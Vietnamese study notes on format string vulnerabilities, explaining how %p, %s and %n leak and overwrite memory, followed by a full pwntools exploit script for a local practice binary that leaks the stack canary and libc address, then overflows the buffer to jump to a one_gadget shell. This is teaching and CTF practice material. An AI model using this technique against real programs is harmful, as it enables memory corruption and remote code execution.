# Giới thiệu chung
- %p, in địa chỉ trên thanh ghi  
  - đối với biến khi a = "A"; print("%p", a) thì khi đến hàm print() trên thanh ghi rsi là 0x41 nên %p sẽ in ra giá trị 0x41  
  - đối với mảng khi a[10] = "ABCDEABCDE" thì print("%p", a) sẽ in ra địa chỉ đầu của mảng  
- %c in ra 1 byte đang có trên thanh ghi và in ra theo ascii nghĩa là 0x1234 thì %c sẽ in ra 0x34 và đổi về kí tự theo mã ascii  
- %s nhận vào địa chỉ và in ra chuỗi mà địa chỉ đó đang trỏ đến, còn đối với mảng, khi print("%s", a) thì thanh ghi sẽ tự truyền địa chỉ đầu mảng vào và 
- %s sẽ trỏ đến địa chỉ đó và in ra cho đến khi gặp 0x00  
- %n đếm số lượng byte được in ra trước nó, rồi ghi vào biến được truyền địa chỉ

> Lưu ý:  
> Đối với 32bit: in dữ liệu trên stack  
>	64bit: 5% đầu của 5 thanh ghi, % thứ 6 là dữ liệu trên stack  


# leak dữ liệu bằng %p
%p sẽ in dữ liệu trên stack dưới dạng hex()
p64(): pack64 chuyển hex sang bytes
u64():unpack chuyển bytes sang hex

# leak dữ liệu = %s
%s leak dữ liệu địa chỉ mà địa chỉ trỏ đến (con) trong con trỏ  

Lưu ý khi fread() đọc dữ liệu từ file vào chương trình, khi đó ta cần lưu ý ,cẩn thận có thể sẽ chia flag ra nhiều phần. 

# %n
để thay đổi dữ liệu của một biến, ta sẽ cho in ra %{giá trị cần thay đổi}$c sau đó dùng %n để đọc các byte đã in ra và lưu vào địa chỉ mà %n trỏ đến  
Trường hợp giá trị cần thay đổi quá lớn thì có thể chia thành 2 lần in, tuy nhiên lần thứ 2, %n sẽ đọc n byte của lần 1 và cộng m byte của lần 2

# FMT & BOF
ở đây ta sử dụng một công cụ mới khi bof ret2libc là one_gadget, one_gadget có chức năng liệt kê ra các system('/bin/sh') và các điều kiện đi kèm, thường dùng cho trường hợp PIE bật.
cú pháp: ``` one_gadget tênfile ```
![image](https://user-images.githubusercontent.com/111769169/221520986-6851fe89-f872-4afa-84c2-d708f57fafd1.png)  

<details> <summary> script </summary>

```python3
from pwn import *
exe = ELF("./fmtstr4_patched")
libc = ELF("./libc-2.31.so")
p = process(exe.path)
gdb.attach(p, gdbscript = '''

b*main+354
c
           ''')
input()

payload = b'01234456789 %21$p %23$p'
p.sendafter(b"ID: ", payload)
p.sendafter(b'Password: ', b'&WPAbC&M!%8S5X#W')
p.recvuntil(b"01234456789 ")

canary = int(p.recv(18), 16)
leak_libc = int(p.recvuntil(b"Enter", drop = True)[1:], 16)
libc.address = leak_libc - 0x24083
log.info('canary: ' + hex(canary))
log.info('leak libc: ' + hex(leak_libc))
log.info('base: ' + hex(libc.address))
log.info('system ' + hex(libc.sym['system']))

one_gadget = libc.address + 0xe3b01
payload2 = b'a' * 56 + p64(canary) + b'b' *8
payload2 +=  p64(one_gadget)
p.sendafter(b"your secret: ", payload2)
p.interactive()
```

</details>

# Tấn công bảng GOT
[FMT_Xmaster.md](https://github.com/wan-hyhty/trainning/blob/task3/FMT/FMT_Xmaster.md)
